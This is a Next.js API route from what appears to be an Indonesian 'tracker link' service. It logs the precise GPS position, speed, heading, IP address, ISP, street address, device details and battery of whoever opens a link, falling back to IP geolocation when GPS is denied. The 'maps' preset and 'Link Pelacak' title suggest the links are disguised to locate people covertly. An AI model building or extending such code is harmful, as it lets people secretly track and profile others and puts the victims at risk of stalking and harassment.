import { NextResponse } from 'next/server';
import { store, reverseGeocode, parseUserAgent } from '@/lib/store';

export async function POST(request, { params }) {
  try {
    const { id } = await params;
    const body = await request.json();

    const {
      latitude,
      longitude,
      accuracy,
      altitude,
      altitudeAccuracy,
      heading,
      speed,
      screenResolution,
      battery,
      connectionType,
      isGpsDenied
    } = body;

    const link = store.getLinkById(id);

    // IP Extraction
    const forwarded = request.headers.get('x-forwarded-for');
    const realIp = request.headers.get('x-real-ip');
    let ip = forwarded ? forwarded.split(',')[0].trim() : (realIp || '127.0.0.1');
    const isLocalhost = ip === '::1' || ip === '127.0.0.1';

    // Device parsing
    const userAgent = request.headers.get('user-agent') || '';
    const deviceInfo = parseUserAgent(userAgent);

    let lat = latitude !== undefined && latitude !== null ? parseFloat(latitude) : null;
    let lng = longitude !== undefined && longitude !== null ? parseFloat(longitude) : null;
    let acc = accuracy !== undefined && accuracy !== null ? parseFloat(accuracy) : 5000;
    const isGps = lat !== null && lng !== null && !isGpsDenied;
    let geoDetails = null;

    if (!isGps) {
      // Fallback: Lookup IP Location using free ip-api.com
      try {
        const queryIp = isLocalhost ? '' : ip;
        const geoRes = await fetch(
          `http://ip-api.com/json/${queryIp}?fields=status,country,regionName,city,lat,lon,isp,query`,
          { signal: AbortSignal.timeout(4000) }
        );
        const geoData = await geoRes.json();

        if (geoData.status === 'success') {
          lat = geoData.lat;
          lng = geoData.lon;
          acc = 3000;
          if (isLocalhost && geoData.query) ip = geoData.query;

          geoDetails = {
            road: `Perkiraan via ISP: ${geoData.isp || 'Jaringan Seluler'}`,
            village: '-',
            district: '-',
            city: geoData.city || 'Kota Terdeteksi',
            state: geoData.regionName || '-',
            country: geoData.country || 'Indonesia',
            isp: geoData.isp || '-',
            isIpFallback: true,
            full_address: `Perkiraan Area: ${geoData.city}, ${geoData.regionName} (${geoData.isp || 'Provider Jaringan'})`
          };
        }
      } catch (err) {
        console.warn('IP fallback lookup error:', err.message);
      }
    } else {
      // Reverse Geocode exact GPS coordinates
      geoDetails = await reverseGeocode(lat, lng);
    }

    // Default fallback if both GPS and IP lookup fail
    if (lat === null || lng === null) {
      lat = -6.2088; // Default fallback to center of Indonesia / Jakarta
      lng = 106.8456;
      acc = 10000;
      geoDetails = {
        road: 'Lokasi Berdasarkan Jaringan Seluler',
        village: '-',
        district: '-',
        city: 'Indonesia',
        state: '-',
        country: 'Indonesia',
        full_address: 'Lokasi kasar berdasarkan IP jaringan seluler'
      };
    }

    const logEntry = {
      linkId: link ? link.id : id,
      linkTitle: link ? link.title : 'Link Pelacak',
      preset: link ? link.preset : 'maps',
      trackingMethod: isGps ? 'GPS Presisi' : 'IP Jaringan (Perkiraan)',
      isGpsDenied: !isGps,
      coordinates: {
        latitude: lat,
        longitude: lng,
        accuracy: acc,
        altitude: altitude !== null && altitude !== undefined ? altitude : null,
        altitudeAccuracy: altitudeAccuracy !== null && altitudeAccuracy !== undefined ? altitudeAccuracy : null,
        heading: heading !== null && heading !== undefined ? heading : null,
        speed: speed !== null && speed !== undefined ? speed : null
      },
      address: geoDetails,
      device: {
        userAgent,
        ...deviceInfo,
        screenResolution: screenResolution || 'Unknown',
        battery: battery || null,
        connectionType: connectionType || 'Unknown'
      },
      ip,
      googleMapsUrl: `https://www.google.com/maps?q=${lat},${lng}`
    };

    const savedLog = store.addLog(logEntry);

    return NextResponse.json({
      success: true,
      message: isGps ? 'Koordinat GPS presisi berhasil dicatat' : 'Perkiraan lokasi IP berhasil dicatat (Fallback)',
      logId: savedLog.id,
      isGps,
      address: geoDetails
    });
  } catch (error) {
    console.error('Track error:', error);
    return NextResponse.json({ success: false, message: 'Gagal memproses data lokasi' }, { status: 500 });
  }
}
